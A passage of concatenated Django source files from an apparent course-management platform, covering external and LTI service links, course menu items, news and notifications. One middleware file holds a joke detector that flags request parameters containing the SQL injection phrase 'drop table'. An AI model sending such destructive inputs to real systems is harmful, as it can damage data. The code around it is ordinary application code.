('inheritance', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LinkService',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance', on_delete=models.CASCADE)),\n                ('url', models.CharField(help_text=b'The service URL', max_length=256)),\n                ('menu_label', models.CharField(help_text=b'A default label to show in the course menu.', max_length=32)),\n                ('menu_icon_class', models.CharField(default=b'icon-globe', help_text=b'A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32)),\n                ('enabled', models.BooleanField(default=True, help_text=b'If not enabled, the service is disabled for all course instances.')),\n            ],\n            options={\n                'ordering': ['menu_label'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='LTIService',\n            fields=[\n                ('linkservice_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='external_services.LinkService', on_delete=models.CASCADE)),\n                ('consumer_key', models.CharField(help_text=b'The consumer key provided by the LTI service.', max_length=128)),\n                ('consumer_secret', models.CharField(help_text=b'The consumer secret provided by the LTI service.', max_length=128)),\n            ],\n            options={\n            },\n            bases=('external_services.linkservice',),\n        ),\n        migrations.CreateModel(\n            name='MenuItem',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('menu_label', models.CharField(help_text=b'Overrides service default label shown in the course menu.', max_length=32, null=True, blank=True)),\n                ('menu_icon_class', models.CharField(help_text=b'Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32, null=True, blank=True)),\n                ('menu_weight', models.IntegerField(default=0, help_text=b'Heavier menu entries are placed after lighter ones.')),\n                ('enabled', models.BooleanField(default=True)),\n                ('course_instance', models.ForeignKey(related_name='ext_services', to='course.CourseInstance', help_text=b'A course instance where the service is used.', on_delete=models.CASCADE)),\n                ('service', models.ForeignKey(to='external_services.LinkService', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['course_instance', 'menu_weight', 'menu_label'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/nexternal_services/migrations/0002_auto_20150427_1717.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='linkservice',\n            name='enabled',\n            field=models.BooleanField(help_text='If not enabled, the service is disabled for all course instances.', default=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_icon_class',\n            field=models.CharField(help_text='A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs', default='icon-globe', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='menu_label',\n            field=models.CharField(help_text='A default label to show in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='linkservice',\n            name='url',\n            field=models.CharField(help_text='The service URL', max_length=256),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_key',\n            field=models.CharField(help_text='The consumer key provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='ltiservice',\n            name='consumer_secret',\n            field=models.CharField(help_text='The consumer secret provided by the LTI service.', max_length=128),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(related_name='ext_services', help_text='A course instance where the service is used.', to='course.CourseInstance', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default menu icon style, e.g. icon-star see http://getbootstrap.com/components/#glyphicons-glyphs', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(null=True, blank=True, help_text='Overrides service default label shown in the course menu.', max_length=32),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_weight',\n            field=models.IntegerField(help_text='Heavier menu entries are placed after lighter ones.', default=0),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexternal_services/migrations/0005_auto_20160829_1344.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_group_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Places menu item under a group label.'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='menuitem',\n            name='menu_url',\n            field=models.CharField(blank=True, null=True, max_length=256, help_text='A link URL (else service default). Relative URLs are relative to course root.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='course_instance',\n            field=models.ForeignKey(help_text='A course where the menu item exists.', to='course.CourseInstance', related_name='ext_services', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_icon_class',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='menu_label',\n            field=models.CharField(blank=True, null=True, max_length=32, help_text='Label for the menu link (else service default).'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='menuitem',\n            name='service',\n            field=models.ForeignKey(help_text='If preconfigured, an external service to link.', to='external_services.LinkService', null=True, blank=True, on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nexternal_services/models.py/n/nfrom django.core.exceptions import ValidationError\nfrom django.urls import reverse\nfrom django.db import models\nfrom django.utils.functional import cached_property\nfrom django.utils.translation import gettext_lazy as _\nfrom urllib.parse import urljoin, urlsplit\n\nfrom course.models import CourseInstance\nfrom inheritance.models import ModelWithInheritance\nfrom lib.helpers import Enum\nfrom lib.models import UrlMixin\n\n\ndef validate_no_domain(value):\n    if value and '://' in value:\n        raise ValidationError(_(\"Url can not contain scheme or domain part.\"))\n\n\nclass LinkService(ModelWithInheritance):\n    '''\n    A link to an external service.\n    '''\n    DESTINATION_REGION = Enum([\n        ('INTERNAL', 0, _('Destination is hosted internally. Link to internal privacy notice.')),\n        ('ORGANIZATION', 1, _('Destination is hosted in the same organization. Link to a privacy notice.')),\n        ('EEA', 3, _('Destination is hosted in European Economic Area. Link to a privacy notice.')),\n        ('PRIVACYSHIELD', 5, _('Destination is hosted out side of European Economic Area, but certified under EU-US Privacy Shield. Link to an extended privacy notice.')),\n        ('GLOBAL', 6, _('Destination is hosted out side of European Economic Area. Link to an extended privacy notice.')),\n    ])\n    url = models.CharField(\n        max_length=256,\n        help_text=_(\"The service URL\")\n    )\n    destination_region = models.PositiveSmallIntegerField(\n        choices=DESTINATION_REGION.choices,\n        default=DESTINATION_REGION.GLOBAL,\n        help_text=_(\"The geographical area of the destination. Will display correct user notice.\"),\n    )\n    privacy_notice_url = models.CharField(\n        max_length=512,\n        blank=True,\n        help_text=_(\"A link to the service privacy notice. This is mandatory for services outside organization!\"))\n    menu_label = models.CharField(\n        max_length=255,\n        help_text=_(\"A default label to show in the course menu.\")\n    )\n    menu_icon_class = models.CharField(\n        max_length=32,\n        default=\"globe\",\n        help_text=_(\"A default menu icon style name, see http://getbootstrap.com/components/#glyphicons-glyphs\")\n    )\n    enabled = models.BooleanField(\n        default=True,\n        help_text=_(\"If not enabled, the service is disabled for all course instances.\")\n    )\n\n    class Meta:\n        ordering = [\"menu_label\"]\n\n    def __str__(self):\n        out = \"{}: {}\".format(self.menu_label, self.url)\n        if not self.enabled:\n            return \"[Disabled] \" + out\n        return out\n\n    def clean(self):\n        errors = {}\n        if self.destination_region > self.DESTINATION_REGION.ORGANIZATION and not self.privacy_notice_url:\n            errors['privacy_notice_url'] = ValidationError(_('Privacy notice URL is mandatory for services outside organization.'))\n        if errors:\n            raise ValidationError(errors)\n\n    @property\n    def url_parts(self):\n        return urlsplit(self.url)\n\n    @property\n    def method(self):\n        return 'GET'\n\n    @property\n    def sends_user_info(self):\n        return False\n\n    def get_url(self, replace=None, kwargs={}):\n        '''Return the URL to the launch page of this service.'''\n        if self.destination_region > self.DESTINATION_REGION.INTERNAL:\n            return reverse('external-service-link', kwargs=kwargs)\n        return self.get_final_url(replace)\n\n    def get_final_url(self, replace=None):\n        '''Return the launch URL for this service.\n\n        The optional replace parameter may be a relative URL that is joined to\n        the URL path of this service. The relative URL must not include a domain.\n        '''\n        url = self.url\n        if replace:\n            assert '://' not in replace and not replace.startswith('//'), \"Replace can't include domain\"\n            url = urljoin(url, replace)\n        return url\n\n\nclass LTIService(LinkService):\n    '''\n    A provider of an LTI service.\n    '''\n    LTI_ACCESS = Enum([\n        ('ANON_API_NO', 0, _('Anonymous service, no API access')),\n        ('PUBLIC_API_NO', 5, _('Public service, no API access')),\n        ('PUBLIC_API_YES', 10, _('Public service, allow API access')),\n    ])\n    access_settings = models.IntegerField(\n        choices=LTI_ACCESS.choices,\n        default=LTI_ACCESS.ANON_API_NO,\n        help_text=_(\"Select whether to pass pseudonymised user data to the LTI service.<br>Public services can also enable sharing the user's API token and course API URL in the LTI launch request. This grants the LTI tool API access with the user's privileges.\")\n    )\n    consumer_key = models.CharField(\n        max_length=128,\n        help_text=_(\"The consumer key provided by the LTI service.\")\n    )\n    consumer_secret = models.CharField(\n        max_length=128,\n        help_text=_(\"The consumer secret provided by the LTI service.\")\n    )\n\n    def __str__(self):\n        out = \"(LTI) {}: {}\".format(self.menu_label, self.url)\n        if not self.enabled:\n            return \"[Disabled] \" + out\n        return out\n\n    @property\n    def method(self):\n        return 'POST'\n\n    @property\n    def sends_user_info(self):\n        return True\n\n    @property\n    def is_anonymous(self):\n        return self.access_settings == self.LTI_ACCESS.ANON_API_NO\n\n    @property\n    def api_access(self):\n        return self.access_settings == self.LTI_ACCESS.PUBLIC_API_YES\n\n    def get_url(self, replace=None, kwargs={}):\n        return reverse('lti-login', kwargs=kwargs)\n\n\nclass MenuItemManager(models.Manager):\n\n    def get_queryset(self):\n        return super().get_queryset().select_related(\n            'course_instance', 'course_instance__course')\n\n\nclass MenuItem(UrlMixin, models.Model):\n    '''\n    Attaches link to course menu.\n    '''\n    ACCESS = Enum([\n        ('STUDENT', 0, _(\"All students, assistants and teachers can access.\")),\n        ('ASSISTANT', 5, _(\"Only assistants and teachers can access.\")),\n        ('TEACHER', 10, _(\"Only teachers can access.\")),\n    ])\n    course_instance = models.ForeignKey(\n        CourseInstance,\n        on_delete=models.CASCADE,\n        related_name=\"ext_services\",\n        help_text=_(\"A course where the menu item exists.\")\n    )\n    access = models.IntegerField(\n        choices=ACCESS.choices,\n        default=ACCESS.STUDENT,\n    )\n    service = models.ForeignKey(\n        LinkService,\n        on_delete=models.CASCADE,\n        blank=True,\n        null=True,\n        help_text=_(\"An external service to link to. These are configured by administrators.\")\n    )\n    menu_url = models.CharField(\n        max_length=256,\n        blank=True,\n        null=True,\n        validators=[validate_no_domain],\n        help_text=_(\"\"\"URL that is a) relative to the service URL or b) this course if no service is selected.\nCase a: url starting with / overwrites path in service url and extends it otherwise.\ncase b: url starting with / is absolute within this service and relative to the course path otherwise.\nNote that URL entered here can not include scheme or domain.\"\"\")\n    )\n    menu_group_label = models.CharField(\n        max_length=255,\n        blank=True,\n        null=True,\n        help_text=_(\"Places menu item under a group label.\")\n    )\n    menu_label = models.CharField(\n        max_length=255,\n        blank=True,\n        null=True,\n        help_text=_(\"Label for the menu link (else service default).\")\n    )\n    menu_icon_class = models.CharField(\n        max_length=32,\n        null=True,\n        blank=True,\n        help_text=_(\"Menu icon style name (else service default), e.g. star see http://getbootstrap.com/components/#glyphicons-glyphs\")\n    )\n    menu_weight = models.IntegerField(\n        default=0,\n        help_text=_(\"Heavier menu entries are placed after lighter ones.\")\n    )\n    enabled = models.BooleanField(default=True)\n\n    class Meta:\n        ordering = [\"course_instance\", \"menu_weight\", \"menu_label\"]\n\n    def __str__(self):\n        out = self.label\n        if not self.is_enabled:\n            return \"[Disabled] \" + out\n        return out\n\n    def clean(self):\n        errors = {}\n        if not self.service:\n            if not self.menu_url:\n                errors['menu_url'] = ValidationError(_('Relative URL is required when there is no preconfigured service selected.'))\n            if not self.menu_label:\n                errors['menu_label'] = ValidationError(_('Menu label is required when there is no preconfigured service selected.'))\n        if errors:\n            raise ValidationError(errors)\n\n    @cached_property\n    def is_enabled(self):\n        if self.service:\n            return self.service.enabled and self.enabled\n        return self.enabled\n\n    @cached_property\n    def label(self):\n        if self.menu_label:\n            return self.menu_label\n        if self.service:\n            return self.service.menu_label\n        return \"\"\n\n    @cached_property\n    def icon_class(self):\n        if self.menu_icon_class:\n            return self.menu_icon_class\n        if self.service:\n            return self.service.menu_icon_class\n        return \"\"\n\n    @cached_property\n    def url(self):\n        if self.service:\n            kwargs = {\n                \"course_slug\": self.course_instance.course.url,\n                \"instance_slug\": self.course_instance.url,\n                \"menu_id\": self.id,\n            }\n            return self.service.as_leaf_class().get_url(replace=self.menu_url, kwargs=kwargs)\n        if '://' in self.menu_url:\n            # Deprecated, but DB can have old urls\n            return self.menu_url\n        return urljoin(self.course_instance.get_absolute_url(), self.menu_url)\n\n    @cached_property\n    def final_url(self):\n        if self.service:\n            return self.service.as_leaf_class().get_final_url(self.menu_url)\n        else:\n            return urljoin(self.course_instance.get_absolute_url(), self.menu_url)\n\n    def get_url_kwargs(self):\n        return dict(menu_id=self.id, **self.course_instance.get_url_kwargs())\n/n/n/ninheritance/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='ModelWithInheritance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('content_type', models.ForeignKey(editable=False, to='contenttypes.ContentType', null=True, on_delete=models.CASCADE)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/ninheritance/models.py/n/nfrom django.contrib.contenttypes.models import ContentType\nfrom django.db import models\nfrom django.db.models.query import QuerySet\n\n\nclass SubclassingQuerySet(QuerySet):\n    def __getitem__(self, k):\n        result = super(SubclassingQuerySet, self).__getitem__(k)\n        if isinstance(result, models.Model) :\n            return result.as_leaf_class()\n        else :\n            return result\n\n    def __iter__(self):\n        for item in super(SubclassingQuerySet, self).__iter__():\n            yield item.as_leaf_class()\n\n\nclass LeafManager(models.Manager):\n    def get_queryset(self):\n        return SubclassingQuerySet(self.model)\n\n\nclass ModelWithInheritance(models.Model):\n    \"\"\"\n    BaseExercise is the base class for all exercise types.\n    It contains fields that are shared among all types.\n    \"\"\"\n\n    objects                 = models.Manager()\n\n    # This ModelManager may be used for retrieving the exercises as instances of their leaf classes.\n    # Alternatively each exercise may be fetched individually as leaf instance by calling the as_leaf_class method.\n    leaf_objects            = LeafManager()\n    content_type            = models.ForeignKey(ContentType,\n                                                on_delete=models.CASCADE,\n                                                editable=False,\n                                                null=True)\n\n    class Meta:\n        abstract = False\n\n    def save(self, *args, **kwargs):\n        \"\"\"\n        Overrides the default save method from Django. If the method is called for\n        a new model, its content type will be saved in the database as well. This way\n        it is possible to later determine if the model is an instance of the\n        class itself or some of its subclasses.\n        \"\"\"\n\n        if not self.content_type:\n            self.content_type = ContentType.objects.get_for_model(self.__class__)\n\n        super(ModelWithInheritance, self).save(*args, **kwargs)\n\n    def as_leaf_class(self):\n        \"\"\"\n        Checks if the object is an instance of a certain class or one of its subclasses.\n        If the instance belongs to a subclass, it will be returned as an instance of\n        that class.\n        \"\"\"\n\n        content_type = self.content_type\n        model_class = content_type.model_class()\n        if (model_class == self.__class__):\n            return self\n        return model_class.objects.get(id=self.id)\n/n/n/nlib/email_messages.py/n/nimport logging\nimport traceback\nfrom django.conf import settings\nfrom django.core.mail import send_mail\nfrom django.urls import reverse\n\nlogger = logging.getLogger('lib.email_messages')\n\n\ndef email_course_error(request, exercise, message, exception=True):\n    \"\"\"\n    Sends error message to course teachers or technical support emails if set.\n    \"\"\"\n    instance = exercise.course_instance\n    if instance.technical_error_emails:\n        recipients = instance.technical_error_emails.split(\",\")\n    else:\n        recipients = (p.user.email for p in instance.course.teachers.all() if p.user.email)\n\n    error_trace = \"-\"\n    if exception:\n        error_trace = traceback.format_exc()\n\n    subject = settings.EXERCISE_ERROR_SUBJECT.format(\n        course=instance.course.code,\n        exercise=str(exercise))\n    body = settings.EXERCISE_ERROR_DESCRIPTION.format(\n        message=message,\n        exercise_url=request.build_absolute_uri(\n            exercise.get_absolute_url()),\n        course_edit_url=request.build_absolute_uri(\n            instance.get_url('course-details')),\n        error_trace=error_trace,\n        request_fields=repr(request))\n    if recipients:\n        try:\n            send_mail(subject, body, settings.SERVER_EMAIL, recipients, True)\n        except Exception as e:\n            logger.exception('Failed to send error emails.')\n/n/n/nlib/middleware.py/n/n\"\"\"\nThis middleware is an easter egg! It is invoked when any request parameters\ncontain the string \"drop table\" (a potential SQL injection) and prevents the\nuser from loading any pages. Instead, a response with internal server error code\nis returned with a \"funny\" error message. The SQL injection attempt is stored in\nthe session, so that the problem persists even if the user reloads the page.\nOther users and the actual system are not affected by this middleware.\n\nThe normal behavior can be restored by giving any request parameter value with the\nstring \"restore table\" in it.\n\"\"\"\n\nfrom django.http import HttpResponseServerError\n\nclass SqlInjectionMiddleware(object):\n\n    def process_request(self, request):\n        for var in request.GET:\n            val = request.GET.get(var).lower()\n            if \"drop table\" in val:\n                request.session[\"hack_attempt\"] = val\n            if \"restore table\" in val and \"hack_attempt\" in request.session:\n                del request.session[\"hack_attempt\"]\n\n        if \"hack_attempt\" in request.session:\n            return HttpResponseServerError(\"Traceback (most recent call last):\\nFile \\\"egg.py\\\", line 1337, in aplus\\nDatabaseIntegrityError: aHR0cDovL3hrY2QuY29tLzMyNy8= is not a valid base64 table identifier\", content_type=\"text/plain\")\n\n        return None\n/n/n/nlib/models.py/n/nfrom django.urls import reverse\n\n\nclass UrlMixin(object):\n    def get_url(self, name, **add_kwargs):\n        kwargs = self.get_url_kwargs()\n        kwargs.update(add_kwargs)\n        return reverse(name, kwargs=kwargs)\n\n    def get_display_url(self):\n        return self.get_absolute_url()\n\n    def get_absolute_url(self):\n        if not hasattr(self, 'ABSOLUTE_URL_NAME'):\n            raise NotImplementedError(\"Model %r doesn't have absolute url\" % self)\n        return self.get_url(self.ABSOLUTE_URL_NAME)\n\n    def get_edit_url(self):\n        if not hasattr(self, 'EDIT_URL_NAME'):\n            raise NotImplementedError(\"Model %r doesn't have absolute url\" % self)\n        return self.get_url(self.EDIT_URL_NAME)\n\n\ndef install_defer_logger():\n    import logging\n    import traceback\n    from django.db.models.query_utils import DeferredAttribute\n\n    logger = logging.getLogger('django.db.deferred')\n    orig_get = DeferredAttribute.__get__\n\n    logger.warning(\"Installing logger for deferred model fields...\")\n\n    def get(self, instance, cls=None):\n        if instance is None:\n            return self\n        if self.field_name not in instance.__dict__:\n            filename, linenum, funcname, command = tuple(traceback.extract_stack()[-2])\n            logger.warning(\"Resolving deferred: %s.%s in %s, line %s, func %s: %s\", instance.__class__.__name__, self.field_name, filename, linenum, funcname, command)\n        return orig_get(self, instance, cls=cls)\n    DeferredAttribute.__get__ = get\n/n/n/nnews/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='News',\n            fields=[\n                ('id', models.AutoField(serialize=False, primary_key=True, auto_created=True, verbose_name='ID')),\n                ('audience', models.IntegerField(choices=[(1, 'Internal users'), (2, 'External users'), (3, 'Internal and external users')], default=3)),\n                ('publish', models.DateTimeField(default=django.utils.timezone.now)),\n                ('title', models.CharField(max_length=255)),\n                ('body', models.TextField()),\n                ('pin', models.BooleanField(default=False)),\n                ('alert', models.CharField(choices=[('', 'No alert'), ('danger', 'Red / Danger'), ('info', 'Blue / Info'), ('success', 'Green / Success'), ('warning', 'Yellow / Warning')], max_length=8, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='news', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['course_instance', '-pin', '-publish'],\n            },\n            bases=(models.Model, lib.models.UrlMixin),\n        ),\n    ]\n/n/n/nnews/models.py/n/nfrom django.db import models\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.utils import timezone\n\nfrom course.models import CourseInstance\nfrom lib.helpers import Enum\nfrom lib.models import UrlMixin\n\n\nclass News(models.Model, UrlMixin):\n    AUDIENCE = CourseInstance.ENROLLMENT_AUDIENCE\n    ALERT = Enum([\n        ('NONE', '', _('No alert')),\n        ('SUCCESS', 'success', _('Green / Success')),\n        ('INFO', 'info', _('Blue / Info')),\n        ('WARNING', 'warning', _('Yellow / Warning')),\n        ('DANGER', 'danger', _('Red / Danger')),\n    ])\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE,\n        related_name=\"news\")\n    audience = models.IntegerField(choices=AUDIENCE.choices, default=AUDIENCE.ALL_USERS)\n    publish = models.DateTimeField(default=timezone.now)\n    title = models.CharField(max_length=255)\n    body = models.TextField()\n    pin = models.BooleanField(default=False)\n    alert = models.CharField(max_length=8, blank=True, choices=ALERT.choices, default=ALERT.NONE)\n\n    class Meta:\n        ordering = ['course_instance', '-pin', '-publish']\n\n    def __str__(self):\n        return \"{} {}\".format(str(self.publish), self.title)\n\n    def get_url_kwargs(self):\n        return dict(news_id=self.id, **self.course_instance.get_url_kwargs())\n/n/n/nnews/templatetags/news.py/n/nfrom django import template\nfrom django.utils import timezone\n\nfrom lib.errors import TagUsageError\nfrom ..cache import CachedNews\nfrom ..models import News\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"news/user_news.html\", takes_context=True)\ndef user_news(context, num, more=0):\n    if not 'instance' in context:\n        raise TagUsageError()\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    if not 'course_news' in context:\n        context['course_news'] = CachedNews(context['instance'])\n    news = context['course_news']\n\n    if context['is_course_staff']:\n        alerts,news = news.for_staff()\n    else:\n        user = context['request'].user\n        alerts,news = news.for_user(\n            not user.is_authenticated\n            or user.userprofile.is_external\n        )\n\n    i = 0\n    for item in news:\n        i += 1\n        item['collapsed'] = i > num\n        if more > 0 and i == more:\n            item['begin_more'] = True\n\n    return {\n        'is_course_staff': context['is_course_staff'],\n        'now': context['now'],\n        'alerts': alerts,\n        'news': news,\n        'more': more,\n    }\n\n\n@register.filter\ndef is_published(entry, now):\n    return entry['publish'] <= now\n\n\n@register.filter\ndef news_audience(audience):\n    return News.AUDIENCE[audience]\n/n/n/nnotification/cache.py/n/nfrom django.db.models.signals import post_save, post_delete\n\nfrom lib.cache import CachedAbstract\nfrom .models import Notification\n\n\nclass CachedNotifications(CachedAbstract):\n    KEY_PREFIX = \"notifications\"\n\n    def __init__(self, user):\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        if not user or not user.is_authenticated:\n            return {\n                'count': 0,\n                'notifications': [],\n            }\n\n        def notification_entry(n):\n            exercise = n.submission.exercise if n.submission else None\n            return {\n                'id': n.id,\n                'submission_id': n.submission.id if n.submission else 0,\n                'name': \"{} {}, {}\".format(\n                    n.course_instance.course.code,\n                    (str(exercise.parent)\n                        if exercise and exercise.parent else\n                     n.course_instance.instance_name),\n                    (str(exercise)\n                        if exercise else\n                     n.subject),\n                ),\n                'link': n.get_display_url(),\n            }\n\n        notifications = list(\n            user.userprofile.received_notifications\\\n                .filter(seen=False)\\\n                .select_related(\n                    'submission',\n                    'submission__exercise',\n                    'course_instance',\n                    'course_instance__course',\n                )\n        )\n        return {\n            'count': len(notifications),\n            'notifications': [notification_entry(n) for n in notifications],\n        }\n\n    def count(self):\n        return self.data['count']\n\n    def notifications(self):\n        return self.data['notifications']\n\n\ndef invalidate_notifications(sender, instance, **kwargs):\n    CachedNotifications.invalidate(instance.recipient.user)\n\n\n# Automatically invalidate cache when notifications change.\npost_save.connect(invalidate_notifications, sender=Notification)\npost_delete.connect(invalidate_notifications, sender=Notification)\n/n/n/nnotification/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Notification',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('subject', models.CharField(max_length=255)),\n                ('notification', models.TextField()),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('seen', models.BooleanField(default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile', on_delete=models.CASCADE)),\n                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['-timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n/n/n/nnotification/migrations/0002_auto_20160912_1341.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0022_auto_20160906_1401'),\n        ('notification', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True, on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='notification',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='sender',\n            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True, on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='subject',\n            field=models.CharField(blank=True, max_length=255),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nnotification/migrations/0003_auto_20160914_1051.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('notification', '0002_auto_20160912_1341'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/nnotification/migrations/0004_auto_20190426_1731.py/n/n# -*- coding: utf-8 -*-\n# Generated by Django 1.10.8 on 2019-04-26 14:31\nfrom __future__ import unicode_literals\n\nfrom django.db import migrations, models\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('notification', '0003_auto_20160914_1051'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='notification',\n            name='sender',\n            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, related_name='sent_notifications', to='userprofile.UserProfile'),\n        ),\n    ]\n/n/n/nnotification/models.py/n/nfrom django.db import models\n\nfrom course.models import CourseInstance\nfrom exercise.models import Submission\nfrom lib.models import UrlMixin\nfrom userprofile.models import UserProfile\n\n\nclass Notification(UrlMixin, models.Model):\n    \"\"\"\n    A user notification of some event, for example manual assessment.\n    \"\"\"\n    subject = models.CharField(max_length=255, blank=True)\n    notification = models.TextField(blank=True)\n    sender = models.ForeignKey(UserProfile, on_delete=models.SET_NULL,\n        related_name=\"sent_notifications\", blank=True, null=True)\n    recipient = models.ForeignKey(UserProfile, on_delete=models.CASCADE,\n        related_name=\"received_notifications\")\n    timestamp = models.DateTimeField(auto_now_add=True)\n    seen = models.BooleanField(default=False)\n    course_instance = models.ForeignKey(CourseInstance, on_delete=models.CASCADE)\n    submission = models.ForeignKey(Submission, on_delete=models.CASCADE,\n        related_name=\"notifications\", blank=True, null=True)\n\n    class Meta:\n        ordering = ['-timestamp']\n\n    def __str__(self):\n        return (\n            \"To:\" + self.recipient.user.username + \", \"\n            + (str(self.submission.exercise) if self.submission else self.subject)\n        )\n\n    @classmethod\n    def send(cls, sender, submission):\n        for recipient in submission.submitters.all():\n            if Notification.objects.filter(\n                submission=submission,\n                recipient=recipient,\n                seen=False,\n            ).count() == 0:\n                notification = Notification(\n                    sender=sender,\n                    recipient=recipient,\n                    course_instance=submission.exercise.course_instance,\n                    submission=submission,\n                )\n                notification.save()\n\n    @classmethod\n    def remove(cls, submission):\n        Notification.objects.filter(\n            submission=submission,\n            recipient__in=submission.submitters.all(),\n            seen=False,\n        ).delete()\n\n    ABSOLUTE_URL_NAME = \"notify\"\n\n    def get_url_kwargs(self):\n        return dict(notification_id=self.id, **self.course_instance.get_url_kwargs())\n/n/n/nselenium_test/grader/exercises/views.py/n/nfrom django.http import HttpResponse\nfrom 